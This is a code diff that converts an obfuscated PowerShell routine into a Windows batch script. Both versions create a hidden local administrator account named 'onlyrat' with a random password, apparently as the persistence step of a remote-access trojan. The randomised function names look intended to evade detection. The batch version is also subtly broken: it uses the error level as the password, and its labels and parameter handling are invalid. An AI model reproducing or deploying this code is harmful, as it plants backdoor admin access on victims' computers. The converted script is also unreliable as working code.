@@ -1,28 +1,17 @@
-function RpLGWiUsIy {
-    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
-}
+@echo off
 
-function geIwCZloBx {
-    [CmdletBinding()]
-    param (
-        [string] $sqbXFdLvyw,
-        [securestring] $CBFXIYeWPR
-    )    
-    begin {
-    }    
-    process {
-        New-LocalUser "$sqbXFdLvyw" -Password $CBFXIYeWPR -FullName "$sqbXFdLvyw" -Description "Temporary local admin"
-        Write-Verbose "$sqbXFdLvyw local user created"
-        Add-LocalGroupMember -Group "Administrators" -Member "$sqbXFdLvyw"
-        Write-Verbose "$sqbXFdLvyw added to the local administrator group"
-    }    
-    end {
-    }
-}
+REM Define function to generate random password
+:function RpLGWiUsIy
+powershell -Command "$password = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_}); Write-Output $password"
 
-# make admin
-$sqbXFdLvyw = "onlyrat"
-$DCilJFugpP = RpLGWiUsIy
-Remove-LocalUser -Name $sqbXFdLvyw
-$HcMjDkGFes = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
-geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $HcMjDkGFes
+REM Define function to create local admin user
+:function geIwCZloBx
+powershell -Command "param ($username, $password); New-LocalUser -Name $username -Password (ConvertTo-SecureString $password -AsPlainText -Force) -FullName $username -Description 'Temporary local admin'; Add-LocalGroupMember -Group 'Administrators' -Member $username"
+
+REM Call functions to create admin user
+call :RpLGWiUsIy
+set "password=%errorlevel%"
+call :geIwCZloBx onlyrat "%password%"
+
+REM Delete functions
+goto :eof
